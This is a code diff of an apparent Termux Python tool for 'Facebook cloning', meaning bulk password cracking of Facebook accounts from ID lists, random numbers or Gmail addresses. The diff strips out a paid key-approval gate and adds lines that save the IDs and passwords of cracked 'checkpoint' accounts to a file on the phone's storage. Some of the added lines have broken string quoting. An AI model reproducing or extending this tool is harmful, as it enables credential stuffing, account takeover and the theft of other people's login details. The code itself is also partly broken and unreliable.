@@ -45,45 +45,6 @@ for agent in range(10000):
         l='Mobile Safari/533.1'
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
-def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
-	clear()
-	print(logo)
-	r1=requests.get("https://github.com/Sherazi00/trick3/blob/main/trick3.txt").text
-	if key1 in r1:
-		os.system('clear')
-		print(logo)
-		Main()
-	else:
-		os.system("clear")
-		print(logo)
-		print("\t \033[1;32m First Get Approvel\033[1;37m ")
-		time.sleep(1)
-		os.system("clear")
-		print(logo)
-		print ("")
-		print(" \033[1;32m SHERAZI Toll Price Rs.200/week Need Get Approved First\033[1;37m\n")
-		print(" \033[1;32m Note : SHERAZI FREE HA BHAIYO ENJOYA   \033[1;37m")
-		print ("")
-		print(" Your Key is Not Approved ")
-		print("")
-		print(" Copy And Send Key To Admin")
-		print ("")
-		print (" Your Key : "+ak+ah+key1 )
-		print ("")
-		name = input(" Your Name : ")
-		print ("")
-		gf = input(" Your gf Name : ")
-		print ("")
-		lol = input(" Your Your Email : ")
-		print ("")
-		input(" Press Enter To Send Key")
-		time.sleep(3.5)
-		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
-		('am start https://wa.me/+923011288884?text=' + tks)
-		Subscraption()        
-Subscraption()
-
 logo=("""\033[1;37m
  db   dD d888888b d8b   db  d888b  
  88 ,8P'   `88'   888o  88 88' Y8b 
@@ -345,7 +306,7 @@ def menu():
                         print("\033[1;36m We Not Responsible if facebook\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;37m")
                         linex()
                         print(' \033[1;31mYour Key Not Registered\033[1;37m')
-                        print(f" \033[1;37mYour Key : {7172}")
+                        print(f" \033[1;37mYour Key : {fkeyx}")
                         linex();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");linex();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')
                         linex()
                         input(" Choose Option : ")
@@ -508,6 +469,8 @@ def ffb(ids,names,passlist):
                                 break
                         elif 'checkpoint' in KING:
                                 if 'y' in pcp:
+                                        print('\r\r\x1b[38;5;208m [KING-CP] '+ids+' | '+pas+'|'\033[1;97m')
+                                        open('/sdcard/KING-CP.txt', 'a').write(ids+'|'+pas+'|'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -736,4 +699,4 @@ except requests.exceptions.ConnectionError:
         print('\n No internet connection ...')
         exit()
 except Exception as e:pass
-Main_apv()
+menu()
